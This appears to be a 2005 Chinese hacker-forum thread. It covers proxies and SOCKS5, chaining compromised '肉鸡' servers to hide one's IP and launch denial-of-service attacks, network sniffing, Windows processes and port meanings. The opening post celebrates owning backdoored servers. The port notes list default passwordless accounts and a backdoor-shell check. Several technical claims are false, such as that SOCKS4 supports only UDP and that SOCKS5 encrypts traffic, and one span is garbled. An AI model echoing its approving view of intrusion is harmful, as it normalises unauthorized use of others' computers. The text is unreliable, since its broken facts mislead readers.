
为普通代理数据没有经过加密（1080端口除外），用一个嗅探器就可以知道你 

输入的数据，别忘了代理的最最基本原理是数据转发哟。好了，有了以上的缺点 

你还敢用或是有信心用它吗？这就是我为什么叫它垃圾的原因了。有网友会问： 

那什么样的代理才没有这些缺点呢？别急，我下面就要说。 

socks5.这是一个很不错的跳板软件，很小（32K）功能却是不凡，它是sock4 

的接替者，原来的sock4只支持UDP协议（这个大家去看书吧，我不多说了）， 

而sock5支持USP和TCP两种协议，还有数据的传输是加密的所以真的很佩服作者的编程能力。如果你简 

单的使用它，那你上个小企鹅啊或IRC啦，那是没有什么问题啦，而且它的速度很快 

几乎和你使用本地机没有什么差别（当然不能加太多跳板），sock5支持你搭建 

255个跳板，也就是你可以用skserverGUI来编辑多达255个安装了sock5的机 

器来运行达到你隐藏IP的目的，但我想如果我看见有人这样做的话，我会马上打 

电话到精神病院~~~：）而且用sc32来配合skserverGUI的话，那么你的电脑 

几乎就没有应用程序不能用代理的。你用过之后一定会说：我喜欢！我选择！sock5的安装也很简单，在此软件的说明书里有，因为我主要是让大家了解代理------&g*;跳板------&g*;肉鸡的简单原理；再者因为制作这样的跳板或肉鸡很有攻击性（会构成非法使用 

他人电脑），而且网上有很多人不自觉，我可不想以后有人被抓了，说我 

曾经为他的犯罪生涯做过贡献。 

好了！最后我们来说说肉鸡吧 

肉鸡是什么？在小企鹅上也有朋友问我，我认为这是中国黑客对自己开了后门的服 

务器为将来自己做一些事时使用的机器的一种自豪而又亲切的叫法.肉鸡是老手 

常用的代理，也就是*elne*的那种，完全是靠自己制作的，端口加密码啦！绝对 

只有你一个人用，当然被别人提前下手的话，那你就清除它的后门就可以了，当 

你第一次拥有这种服务器的时候你的心情是什么样的？我个人感觉是象初恋一样 

。 

有3389肉鸡通常可以图形化*作，从而发动拒绝服务攻击，那么我们用什么样
系统的肉鸡呢？~~~~恩！marke这个 

问题问的很好~~：） 

我喜欢用windows 2000和linux，虽然我一直采用WIN 2000但是告诉大家一个 

好消息我刚刚拥有了自己第一台LINUX肉鸡，对我这个正在学习LINUX的家伙来 

说，没事到上面熟悉一下LINUX指令是件很愉快的事。要想学用这种肉鸡必须熟 

练DOS指令（指windows)，因为没有图形界面让你玩的。做一个黑客必须适应字符化的*作
当你*elne*到一台你服务器里（肉鸡） 


你就可以踏雪无痕了，就象“信息公路牛崽”（抢劫服务器五角大楼的美国天才黑客）一 

样先连接到日本、到中东、再绕回美国本土抢劫服务器五角大楼，听上去很神秘吧，其 

实用的原理就是这个。






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:44am 

网络监听概念 


网络监听工具的提供给管理员的一类管理工具。使用这种工具，可以监视网络的状态、数据流动情况以及网络上传输的信息。 

　　但是网络监听工具也是黑客们常用的工具。当信息以明文的形式在网络上传输时，便可以使用网络监听的方式来进行攻击。将网络接口设置在监听模式，便可以源源不断地将网上传输的信息截获。 

　　网络监听可以在网上的任何一个位置实施，如局域网中的一台主机、网关上或远程网的调制解调器之间等。黑客们用得最多的是截获用户的口令。 

　　什么是网络监听 

　　网络监听是黑客们常用的一种方法。当成功地登录进一台网络上的主机，并取得了这台主机的超级用户的权限之后，往往要扩大战果，尝试登录或者夺取网络中其他主机的控制友。而网络监听则是一种最简单而且最有效的方法，它常常能轻易地获得用其他方法很难获得的信息。 

　　在网络上，监听效果最好的地方是在网关、路由器、防火墙一类的设备处，通常由网络管理员来操作。使用最方便的是在一个以太网中的任何一台上网的主机上，这是大多数黑客的做法。 



以太网中可以监听的原因 

　　在电话线路和无线电、微波中监听传输的信息比较好理解，但是人们常常不太理解为什么局域网中可以进行监听。甚至有人问：能不能监听不在同一网段的信息。下面就讲述在以太网中进行监听的一些原理。在令牌环中，道理是相似的。 

　　对于一个施行网络攻击的人来说，能攻破网关、路由器、防火墙的情况极为少见，在这里完全可以由安全管理员安装一些设备，对网络进行监控，或者使用一些专门的设备，运行专门的监听软件，并防止任何非法访关。然而，潜入一台不引人注意的计算机中，悄悄地运行一个监听程序，一个黑客是完全可以做到的。监听是非常消耗CPU资源的，在一个担负繁忙任务的计算机中进行监听，可以立即被管理员发现，因为他发现计算机的响应速度令人惊奇慢。 

　　对于一台连网的计算机，最方便的是在以太网中进行监听，只须安装一个监听软件，然后就可以坐在机器旁浏览监听到的信息了。 

　　以太网协议的工作方式为将要发送的数据包发往连在一起的所有主机。在包头中包含着应该接收数据包的主机的正确地址。因此，只有与数据包中目标地址一致的那台主机才能接收信包。但是，当主机工在监听模式下，无论数据包中的目标物理地址是什么，主机都将接收。 

　　在Internet上，有许多这样的局域网。几台甚至十几台主机通过一条电缆一个集线器连在一起。在协议的高层或用户看来，当同一网络中的两台主机通信时，源主机将写有目的主机IP地址的数据包发向网关。但是，这种数据包并不能在协议栈的高层直接发送出去。要发送的数据包必须从TCP/IP协议的IP层交给网络接口，即数据链路层。 

　　网络接口不能识别IP地址。在网络接口，由IP层来的带有IP地址的数据包又增加了一部分信息：以太帧的帧头。在帖头中，有两个域分别为只有网络接口才能识别的源主机和目的主机的物理地址，这是一个48位的地址。这个48位的地址是与IP地址对应的。也就是说，一个IP地址，必然对应一个物理地址。对于作为网关的主机，由于它连接了多个网络，因此它同时具有多个IP地址，在每个网络中，它都有一个。发向局域网之外的帧中携带的是网关的物理地址。 



在以太网中，填写了物理地址的帧从网络接口中，也就是从网卡中发送出去，传送到物理的线路上。如果局域网是由一条粗缆或细缆连接机而成，则数字信号在电缆上传输，信号能够到达线路上的每一台主机。当使用集线器时，发送出去的信号到达集线器，由集线器再发向连接在信线器上的每一条线路。于是，在物理线路上传输的数字信号也能到达连接在集线器上的每一主机。 

　　数字信号到达一台主机的网络接口时，在正常情况下，网络接口读入数据帧，进行检查，如果数据帧中携带的确良物理地址是自己的，或者物理地址是广播地址，则将数据帧交给上层协议软件，也就是IP层软件，否则就将这个帧丢弃。对于每一个到达网络接口的数据帧，都要进行这个过程。然而，当主机工作在监听模式下，则所有的数据帧都将被交给上层协议软件处理。 

　　局域网的这种工作方式，一个形象的例子是，大房间就像是一个共享的信道，里面的每个人好像是一台主机。人们所说的话是信息包，在大房间中到处传播。当我们对其中某个人说话时，所有的人都能听到。但只有名字相同的那个人，才会对这些话语做出反映，进行处理。其余的人听到了这些谈话，只能从发呆中猜测，是否在监听他人的谈话。 

　　当连接在同一条电缆或集线器上的主机被逻辑地分为几个子网时，如果一台主机处于监听模式下，它还能接收到发向与自己不在同一子网(使用了不同的掩码、IP地址和网关)的主机的那些信包。也就是说，在同一条物理信道上传输的所有信息都可以被接收到。 

　　许多人会问：能不能监听不在同一个网段计算机传输的信息。答案是否定的，一台计算机只能监听经过自己网络接口的那些信包。否则，我们将能监听到整个Internet,情形会多么可怕。 



目前的绝大多数计算机网络使用共享的通信信道。从上面的讨论中，我们知道，通信信道的共享意味着，计算机有可能接收发向另一台计算机的信息。 

　　另外，要说明的是，Internet中使用的大部分协议都是很早设计的，许多协议的实现都是基于一种非常友好的，通信的双方充分信任的基础之上。因此，直到现在，网络安全还是非常脆弱的。在通常的网络环境下，用户的所有信息，包手户头和口令信息都是以明文的方式在网上传输。因此，对于一个网络黑客和网络攻击者进行网络监听，获得用户的各种信息并不是一件很困难的事。只要具有初步的网络和TCP/IP协议知识，便能轻易地从监听到的信息中提取出感兴趣的部分。 

　　网络监听常常要保存大量的信息，对收集的信息进行大量的整理工作，因此，正在进行监的机器对用户的请求响应很慢。 

　　首先，网络监听软件运行时，需要消耗大量的处理器时间，如果在此时，就详细地分析包中的内容，许多包就会来不信接收而漏掉。因此，网络监听软件通常都是将监听到的包存放在文件中，待以后再分析。 

　　其次，网络中的数据包非常复杂，两台主机之间即使连续发送和接受数据包，在监听到的结果中，中间必然会夹杂了许多别的主机交互的数据包。监听软件将同一TCP会话的包整理到一起，已经是很不错了。如果还希望将用户的详细信息整理出眯，需要根据协议对包进行大量的分析。面对网络上如此众多的协议，这个监听软件将会十分庞大。 

　　其实，找这些信息并不是一件难事。只要根据一定的规律，很容易将有用的信息一一提取出来。 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:44am 

系统进程信息 

[system process] - [system process] - 进程信息
进程文件: [system process] or [system process]
进程名称: Windows内存处理系统进程
描述: Windows页面内存管理进程，拥有0级优先。 


alg - alg.exe - 进程信息
进程文件: alg or alg.exe
进程名称: 应用层网关服务
描述: 这是一个应用层网关服务用于网络共享。 


csrss - csrss.exe - 进程信息
进程文件: csrss or csrss.exe
进程名称: Client/Server Runtime Server Subsystem
描述: 客户端服务子系统，用以控制Windows图形相关子系统。 


ddhelp - ddhelp.exe - 进程信息
进程文件: ddhelp or ddhelp.exe
进程名称: DirectDraw Helper
描述: DirectDraw Helper是DirectX这个用于图形服务的一个组成部分。 


dllhost - dllhost.exe - 进程信息
进程文件: dllhost or dllhost.exe
进程名称: DCOM DLL Host进程
描述: DCOM DLL Host进程支持基于COM对象支持DLL以运行Windows程序。 


explorer - explorer.exe - 进程信息
进程文件: explorer or explorer.exe
进程名称: 程序管理
描述: Windows Program Manager或者Windows Explorer用于控制Windows图形Shell，包括开始菜单、任务栏，桌面和文件管理。 


inetinfo - inetinfo.exe - 进程信息
进程文件: inetinfo or inetinfo.exe
进程名称: IIS Admin Service Helper
描述: InetInfo是Microsoft Internet Infomation Services (IIS)的一部分，用于Debug调试除错。 


internat - internat.exe - 进程信息
进程文件: internat or internat.exe
进程名称: Input Locales
描述: 这个输入控制图标用于更改类似国家设置、键盘类型和日期格式。 


kernel32 - kernel32.dll - 进程信息
进程文件: kernel32 or kernel32.dll
进程名称: Windows壳进程
描述: Windows壳进程用于管理多线程、内存和资源。 


lsass - lsass.exe - 进程信息
进程文件: lsass or lsass.exe
进程名称: 本地安全权限服务
描述: 这个本地安全权限服务控制Windows安全机制。 


mdm - mdm.exe - 进程信息
进程文件: mdm or mdm.exe
进程名称: Machine Debug Manager
描述: Debug除错管理用于调试应用程序和Microsoft Office中的Microsoft Script Editor脚本编辑器。 


mmtask - mmtask.tsk - 进程信息
进程文件: mmtask or mmtask.tsk
进程名称: 多媒体支持进程
描述: 这个Windows多媒体后台程序控制多媒体服务，例如MIDI。 


mprexe - mprexe.exe - 进程信息
进程文件: mprexe or mprexe.exe
进程名称: Windows路由进程
描述: Windows路由进程包括向适当的网络部分发出网络请求。 


msgsrv32 - msgsrv32.exe - 进程信息
进程文件: msgsrv32 or msgsrv32.exe
进程名称: Windows信使服务
描述: Windows信使服务调用Windows驱动和程序管理在启动。 


mstask - mstask.exe - 进程信息
进程文件: mstask or mstask.exe
进程名称: Windows计划任务
描述: Windows计划任务用于设定继承在什么时间或者什么日期备份或者运行。 


regsvc - regsvc.exe - 进程信息
进程文件: regsvc or regsvc.exe
进程名称: 远程注册表服务
描述: 远程注册表服务用于访问在远程计算机的注册表。 


rpcss - rpcss.exe - 进程信息
进程文件: rpcss or rpcss.exe
进程名称: RPC Portmapper
描述: Windows 的RPC端口映射进程处理RPC调用(远程模块调用)然后把它们映射给指定的服务提供者。 


services - services.exe - 进程信息
进程文件: services or services.exe
进程名称: Windows Service Controller
描述: 管理Windows服务。 


smss - smss.exe - 进程信息
进程文件: smss or smss.exe
进程名称: Session Manager Subsystem
描述: 该进程为会话管理子系统用以初始化系统变量，MS-DOS驱动名称类似LPT1以及COM，调用Win32壳子系统和运行在Windows登陆过程。 


snmp - snmp.exe - 进程信息
进程文件: snmp or snmp.exe
进程名称: Microsoft SNMP Agent
描述: Windows简单的网络协议代理（SNMP）用于监听和发送请求到适当的网络部分。 


spool32 - spool32.exe - 进程信息
进程文件: spool32 or spool32.exe
进程名称: Printer Spooler
描述: Windows打印任务控制程序，用以打印机就绪。 


spoolsv - spoolsv.exe - 进程信息
进程文件: spoolsv or spoolsv.exe
进程名称: Printer Spooler Service
描述: Windows打印任务控制程序，用以打印机就绪。 


stisvc - stisvc.exe - 进程信息
进程文件: stisvc or stisvc.exe
进程名称: Still Image Service
描述: Still Image Service用于控制扫描仪和数码相机连接在Windows。 


svchost - svchost.exe - 进程信息
进程文件: svchost or svchost.exe
进程名称: Service Host Process
描述: Service Host Process是一个标准的动态连接库主机处理服务。 


system - system - 进程信息
进程文件: system or system
进程名称: Windows System Process
描述: Microsoft Windows系统进程。 


taskmon - taskmon.exe - 进程信息
进程文件: taskmon or taskmon.exe
进程名称: Windows Task Optimizer
描述: windows任务优化器监视你使用某个程序的频率，并且通过加载那些经常使用的程序来整理优化硬盘。 


tcpsvcs - tcpsvcs.exe - 进程信息
进程文件: tcpsvcs or tcpsvcs.exe
进程名称: TCP/IP Services
描述: TCP/IP Services Application支持透过TCP/IP连接局域网和Internet。 


winlogon - winlogon.exe - 进程信息
进程文件: winlogon or winlogon.exe
进程名称: Windows Logon Process
描述: Windows NT用户登陆程序。 


winmgmt - winmgmt.exe - 进程信息
进程文件: winmgmt or winmgmt.exe
进程名称: Windows Management Service
描述: Windows Management Service透过Windows Management Instrumentation data (WMI)技术处理来自应用客户端的请求 


--------------------






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:45am 

端口全解析（上） 

端口可分为3大类： 

1） 公认端口（Well Known Ports）：从0到1023，它们紧密绑定于一些服务。通常这些端口的通讯明确表明了某种服 务的协议。例如：80端口实际上总是HTTP通讯。 

2） 注册端口（Registered Ports）：从1024到49151。它们松散地绑定于一些服务。也就是说有许多服务绑定于这些端口，这些端口同样用于许多其它目的。例如：许多系统处理动态端口从1024左右开始。 

3） 动态和/或私有端口（Dynamic and/or Private Ports）：从49152到65535。理论上，不应为服务分配这些端口。实际上，机器通常从1024起分配动态端口。但也有例外：SUN的RPC端口从32768开始。 

　　本节讲述通常TCP/UDP端口扫描在防火墙记录中的信息。记住：并不存在所谓ICMP端口。如果你对解读ICMP数据感兴趣，请参看本文的其它部分。0通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试 图使用一种通常的闭合端口连接它时将产生不同的结果。一种典型的扫描：使用IP地址为 0.0.0.0，设置ACK位并在以太网层广播。 1 tcpmux 这显示有人在寻找SGIIrix机器。Irix是实现tcpmux的主要提供者，缺省情况下tcpmux在这种系统中被打开。Iris机器在发布时含有几个缺省的无密码的帐户，如lp,guest, uucp, nuucp, demos, tutor, diag, EZsetup, OutOfBox, 和4Dgifts。许多管理员安装后忘记删除这些帐户。因此Hacker们在Internet上搜索tcpmux 并利用这些帐户。 7Echo你能看到许多人们搜索Fraggle放大器时，发送到x.x.x.0和x.x.x.255的信息。常见的一种DoS攻击是echo循环（echo-loop），攻击者伪造从一个机器发送到另一个UDP数据包，而两个机器分别以它们最快的方式回应这些数据包。（参见Chargen） 另一种东西是由DoubleClick在词端口建立的TCP连接。有一种产品叫做Resonate Global Dispatch”，它与DNS的这一端口连接以确定最近的路由。Harvest/squid cache将从3130端口发送UDPecho：“如果将cache的source_ping on选项打开，它将对原始主机的UDP echo端口回应一个HIT reply。”这将会产生许多这类数据包。 

11 sysstat这是一种UNIX服务，它会列出机器上所有正在运行的进程以及是什么启动了这些进程。这为入侵者提供了许多信息而威胁机器的安全，如暴露已知某些弱点或帐户的程序。这与UNIX系统中“ps”命令的结果相似再说一遍：ICMP没有端口，ICMP port 11通常是ICMPtype=1119 chargen 这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时，会发送含有垃圾字符的数据流知道连接关闭。Hacker利用IP欺骗可以发动DoS攻击伪造两 个chargen服务器之间的UDP由于服务器企图回应两个服务器之间的无限的往返数据通讯一个chargen和echo将导致服务器过载。同样fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。 

21 ftp最常见的攻击者用于寻找打开“anonymous”的ftp服务器的方法。这些服务器带有可读写的目录。Hackers或tackers利用这些服务器作为传送warez (私有程序) 和pr0n(故意拼错词而避免被搜索引擎分类)的节点。 

22 sshPcAnywhere建立TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点。如果配置成特定的模式，许多使用RSAREF库的版本有不少漏洞。（建议在其它端口运行ssh）还应该注意的是ssh工具包带有一个称为ake-ssh-known-hosts的程序。它会扫描整个域的ssh主机。你有时会被使用这一程序的人无意中扫描到。UDP（而不是TCP）与另一端的5632端口相连意味着存在搜索pcAnywhere的扫描。5632 （十六进制的0x1600）位交换后是0x0016（使进制的22）。 

23 Telnet入侵者在搜索远程登陆UNIX的服务。大多数情况下入侵者扫描这一端口是为了找到机器运行的操作系统。此外使用其它技术，入侵者会找到密码。 

25 smtp攻击者（spammer）寻找SMTP服务器是为了传递他们的spam。入侵者的帐户总被关闭，他们需要拨号连接到高带宽的e-mail服务器上，将简单的信息传递到不同的地址。SMTP服务器（尤其是sendmail）是进入系统的最常用方法之一，因为它们必须完整的暴露于Internet且邮件的路由是复杂的（暴露+复杂=弱点）。 

53 DNSHacker或crackers可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其它通讯。因此防火墙常常过滤或记录53端口。 需要注意的是你常会看到53端口做为UDP源端口。不稳定的防火墙通常允许这种通讯并假设这是对DNS查询的回复。Hacker常使用这种方法穿透防火墙。 

67和68 Bootp和DHCPUDP上的Bootp/DHCP：通过DSL和cable-modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址分配。Hacker常进入它们分配一个地址把自己作为局部路由器而发起大量的“中间人”（man-in-middle）攻击。客户端向68端口（bootps）广播请求配置，服务器向67端口（bootpc）广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。69 TFTP(UDP) 许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常错误配置而从系统提供任何文件，如密码文件。它们也可用于向系统写入文件 

79 finger Hacker用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其它机器finger扫描。 

98 linuxconf 这个程序提供linuxboxen的简单管理。通过整合的HTTP服务器在98端口提供基于Web界面的服务。它已发现有许多安全问题。一些版本setuidroot，信任局域网，在/tmp下建立Internet可访问的文件，LANG环境变量有缓冲区溢出。 此外因为它包含整合的服务器，许多典型的HTTP漏洞可能存在（缓冲区溢出，历遍目录等）109 POP2并不象POP3那样有名，但许多服务器同时提供两种服务（向后兼容）。在同一个服务器上POP3的漏洞在POP2中同样存在。 



110 POP3用于客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交换缓冲区溢出的弱点至少有20个（这意味着Hacker可以在真正登陆前进入系统）。成功登陆后还有其它缓冲区溢出错误。 

111 sunrpc portmap rpcbind Sun RPCPortMapper/RPCBIND。访问portmapper是扫描系统查看允许哪些RPC服务的最早的一步。常 见RPC服务有：pc.mountd, NFS, rpc.statd, rpc.csmd, rpc.ttybd, amd等。入侵者发现了允许的RPC服务将转向提供 服务的特定端口测试漏洞。记住一定要记录线路中的daemon, IDS, 或sniffer，你可以发现入侵者正使用什么程序访问以便发现到底发生了什么。 

113 Ident auth .这是一个许多机器上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多机器的信息（会被Hacker利用）。但是它可作为许多服务的记录器，尤其是FTP, POP, IMAP, SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，你将会看到许多这个端口的连接请求。记住，如果你阻断这个端口客户端会感觉到在防火墙另一边与e-mail服务器的缓慢连接。许多防火墙支持在TCP连接的阻断过程中发回T，着将回停止这一缓慢的连接。 

119 NNTP news新闻组传输协议，承载USENET通讯。当你链接到诸如：news:p.security.firewalls/. 的地址时通常使用这个端口。这个端口的连接企图通常是人们在寻找USENET服务器。多数ISP限制只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送spam。 

135 oc-serv MS RPC end-point mapper Microsoft在这个端口运行DCE RPC end- point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和/或RPC的服务利用 机器上的end-point mapper注册它们的位置。远端客户连接到机器时，它们查询end-point mapper找到服务的位置。同样Hacker扫描机器的这个端口是为了找到诸如：这个机器上运 行Exchange Server吗？是什么版本？ 这个端口除了被用来查询服务（如使用epdump）还可以被用于直接攻击。有一些DoS攻 击直接针对这个端口。 

137 NetBIOS name service nbtstat (UDP)这是防火墙管理员最常见的信息，请仔细阅读文章后面的NetBIOS一节 139 NetBIOS　File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows“文件和打印机共享”和SAMBA。在Internet上共享自己的硬盘是可能是最常见的问题。 大量针对这一端口始于1999，后来逐渐变少。2000年又有回升。一些VBS（IE5 VisualBasicScripting）开始将它们自己拷贝到这个端口，试图在这个端口繁殖。 

143 IMAP和上面POP3的安全问题一样，许多IMAP服务器有缓冲区溢出漏洞运行登陆过程中进入。记住：一种Linux蠕虫（admw0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已被感染的用户。当RadHat在他们的Linux发布版本中默认允许IMAP后，这些漏洞变得流行起来。Morris蠕虫以后这还是第一次广泛传播的蠕虫。这一端口还被用于IMAP2，但并不流行。 已有一些报道发现有些0到143端口的攻击源于脚本。 

161 SNMP(UDP)入侵者常探测的端口。SNMP允许远程管理设备。所有配置和运行信息都储存在数据库中，通过SNMP客获得这些信息。许多管理员错误配置将它们暴露于Internet。Crackers将试图使用缺省的密码“public”“private”访问系统。他们可能会试验所有可能的组合。 SNMP包可能会被错误的指向你的网络。Windows机器常会因为错误配置将HP JetDirect rmote management软件使用SNMP。HP OBJECT IDENTIFIER将收到SNMP包。新版的Win98使用SNMP解析域名，你会看见这种包在子网内广播（cable modem, DSL）查询sysName和其它信息。 

162 SNMP trap 可能是由于错误配置 

177 xdmcp 许多Hacker通过它访问X-Windows控制台，它同时需要打开6000端口。 

513 rwho 可能是从使用cable modem或DSL登陆到的子网中的UNIX机器发出的广播。这些人为Hacker进入他们的系统提供 了很有趣的信息 

553 CORBA IIOP (UDP) 如果你使用cable modem或DSL VLAN，你将会看到这个端口的广播。CORBA是一种面向对象的RPC（remote procedure call）系统。Hacker会利用这些信息进入系统。 600 Pcserver backdoor 请查看1524端口一些玩script的孩子认为他们通过修改ingreslock和pcserver文件已经完全攻破了系统-- Alan J. Rosenthal.
端口全解析（下） 

635 mountd Linux的mountd Bug。这是人们扫描的一个流行的Bug。大多数对这个端口的扫描是基于UDP的，但基于TCP 的mountd有所增加（mountd同时运行于两个端口）。记住，mountd可运行于任何端口（到底在哪个端口，需要在端口111做portmap查询），只是Linux默认为635端口，就象NFS通常运行于2049端口1024 许多人问这个端口是干什么的。它是动态端口的开始。许多程序并不在乎用哪个端口连接网络，它们请求操作系统为它们分配“下一个闲置端口”。基于这一点分配从端口1024开始。这意味着第一个向系统请求分配动态端口的程序将被分配端口1024。为了验证这一点，你可以重启机器，打开Telnet，再打开一个窗口运行“natstat -a”，你将会看到Telnet被分配1024端口。请求的程序越多，动态端口也越多。操作系统分配的端口将逐渐变大。再来一遍，当你浏览Web页时用“netstat”查看，每个Web页需要一个新端口。 

1025 参见1024 

1026 参见1024 

1080 SOCKS 这一协议以管道方式穿过防火墙，允许防火墙后面的许多人通过一个IP地址访问Internet。理论上它应该只允许内部的通信向外达到Internet。但是由于错误的配置，它会允许Hacker/Cracker的位于防火墙外部的攻击穿过防火墙。或者简单地回应位于Internet上的计算机，从而掩饰他们对你的直接攻击。 WinGate是一种常见的Windows个人防火墙，常会发生上述的错误配置。在加入IRC聊天室时常会看到这种情况。 

1114 SQL 系统本身很少扫描这个端口，但常常是sscan脚本的一部分。 

1243 Sub-7木马（TCP）参见Subseven部分。 

1524 ingreslock后门 许多攻击脚本将安装一个后门Sh*ll 于这个端口（尤其是那些针对Sun系统中Sendmail和RPC服务漏洞的脚本，如statd,ttdbserver和cmsd）。如果你刚刚安装了你的防火墙就看到在这个端口上的连接企图，很可能是上述原因。你可以试试Telnet到你的机器上的这个端口，看看它是否会给你一个Sh*ll 。连接到600/pcserver也存在这个问题。 

2049 NFS NFS程序常运行于这个端口。通常需要访问portmapper查询这个服务运行于哪个端口，但是大部分情况是安装后NFS杏谡飧龆丝冢?acker/Cracker因而可以闭开portmapper直接测试这个端口。 

3128 squid 这是Squid HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。你也会看到搜索其它代理服务器的端口： 000/8001/8080/8888。扫描这一端口的另一原因是：用户正在进入聊天室。其它用户（或服务器本身）也会检验这个端口以确定用户的机器是否支持代理。请查看5.3节。 

5632 pcAnywere你会看到很多这个端口的扫描，这依赖于你所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能得代理（译者：指agent而不是proxy）。Hacker/cracker也会寻找开放这种服务的机器，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描常包含端口22的UDP数据包。参见拨号扫描。 

6776 Sub-7 artifact 这个端口是从Sub-7主端口分离出来的用于传送数据的端口。例如当控制者通过电话线控制另一台机器，而被控机器挂断时你将会看到这种情况。因此当另一人以此IP拨入时，他们将会看到持续的，在这个端口的连接企图。（译者：即看到防火墙报告这一端口的连接企图时，并不表示你已被Sub-7控制。）6970 RealAudio RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP7070端口外向控制连接设置13223 PowWow PowWow 是Tribal Voice的聊天程序。它允许用户在此端口打开私人聊天的接。这一程序对于建立连接非常具有“进攻性”。它会“驻扎”在这一TCP端口等待回应。这造成类似心跳间隔的连接企图。如果你是一个拨号用户，从另一个聊天者手中“继承”了IP地址这种情况就会发生：好象很多不同的人在测试这一端口。这一协议使用“OPNG”作为其连接企图的前四个字节。 

17027 Conducent这是一个外向连接。这是由于公司内部有人安装了带有Conducent "adbot" 的共享软件。Conducent "adbot"是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。有人试验：阻断这一外向连接不会有任何问题，但是封掉IP地址本身将会导致adbots持续在每秒内试图连接多次而导致连接过载： 机器会不断试图解析DNS名─ads.conducent.com，即IP地址216.33.210.40 ； 216.33.199.77 ；216.33.199.80 ；216.33.199.81；216.33.210.41。（译者：不知NetAnts使用的Radiate是否也有这种现象） 

27374 Sub-7木马(TCP) 参见Subseven部分。 

30100 NetSphere木马(TCP) 通常这一端口的扫描是为了寻找中了NetSphere木马。 

31337 Back Orifice “eliteHacker中31337读做“elite”/ei’li:t/（译者：法语，译为中坚力量，精华。即 3=E, 1=L, 7=T）。因此许多后门程序运行于这一端口。其中最有名的是Back Orifice。曾经一段时间内这是Internet上最常见的扫描。现在它的流行越来越少，其它的 木马程序越来越流行。 

31789 Hack-a-tack 这一端口的UDP通讯通常是由于"Hack-a-tack"远程访问木马（RAT,Remote Access Trojan）。这种木马包含内置的31790端口扫描器，因此任何31789端口到317890端口的连 接意味着已经有这种入侵。（31789端口是控制连接，317890端口是文件传输连接） 

32770~32900 RPC服务 Sun Solaris的RPC服务在这一范围内。详细的说：早期版本的Solaris（2.5.1之前）将 portmapper置于这一范围内，即使低端口被防火墙封闭仍然允许Hacker/cracker访问这一端口。 扫描这一范围内的端口不是为了寻找portmapper，就是为了寻找可被攻击的已知的RPC服务。 

33434~33600 traceroute 如果你看到这一端口范围内的UDP数据包（且只在此范围之内）则可能是由于traceroute。参见traceroute分。 

41508 Inoculan早期版本的Inoculan会在子网内产生大量的UDP通讯用于识别彼此。参见 http://www.circlemud.org/~jelson/software/udpsend.html
http://www.ccd.bnl.gov/nss/tips/inoculan/index.html
端口1~1024是保留端口，所以它们几乎不会是源端口。但有一些例外，例如来自NAT机器的连接。 常看见紧接着1024的端口，它们是系统分配给那些并不在乎使用哪个端口连接的应用程序的“动态端口”。 Server Client 服务描述 

1-5/tcp 动态 FTP 1-5端口意味着sscan脚本 

20/tcp 动态 FTP FTP服务器传送文件的端口 

53 动态 FTP DNS从这个端口发送UDP回应。你也可能看见源/目标端口的TCP连接。 

123 动态 S/NTP 简单网络时间协议（S/NTP）服务器运行的端口。它们也会发送到这个端口的广播。 

27910~27961/udp 动态 Quake Quake或Quake引擎驱动的游戏在这一端口运行其服务器。因此来自这一端口范围的UDP包或发送至这一端口范围的UDP包通常是游戏。 

61000以上 动态 FTP 61000以上的端口可能来自Linux NAT服务器（IP asquerade） 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:46am 

端口详细说明表（上） 


1　tcpmux　TCPPortServiceMultiplexer　传输控制协议端口服务多路开关选择器
2　compressnet　ManagementUtility　　compressnet管理实用程序
3　compressnet　CompressionProcess　　压缩进程
5　rje　RemoteJobEntry　　　　远程作业登录
7　echo　Echo　　　　　　回显
9　discard　Discard　　　　丢弃
11　systat　ActiveUsers　　　　在线用户
13　daytime　Daytime　　　　　时间
17　qotd　QuoteoftheDay　　　每日引用
18　msp　MessageSendProtocol　　　消息发送协议
19　chargen　CharacterGenerator　　字符发生器
20　ftp-data　FileTransfer[DefaultData]　文件传输协议(默认数据口)　
21　ftp　FileTransfer[Control]　　　文件传输协议(控制)
22　ssh　SSHRemoteLoginProtocol　　SSH远程登录协议
23　telnet　Telnet　　　　终端仿真协议
24　anyprivatemailsystem　　　预留给个人用邮件系统
25　smtp　SimpleMailTransfer　　　简单邮件发送协议
27　nsw-fe　NSWUserSystemFE　　　NSW用户系统现场工程师
29　msg-icp　MSGICP　　　　　MSG　ICP
31　msg-auth　MSGAuthentication　　MSG验证
33　dsp　DisplaySupportProtocol　　显示支持协议
35　anyprivateprinterserver　　预留给个人打印机服务
37　time　Time　　　　　　时间
38　rap　RouteAccessProtocol　　　路由访问协议
39　rlp　ResourceLocationProtocol　　资源定位协议
41　graphics　Graphics　　　　图形
42　nameserver　WINSHostNameServer　　WINS主机名服务
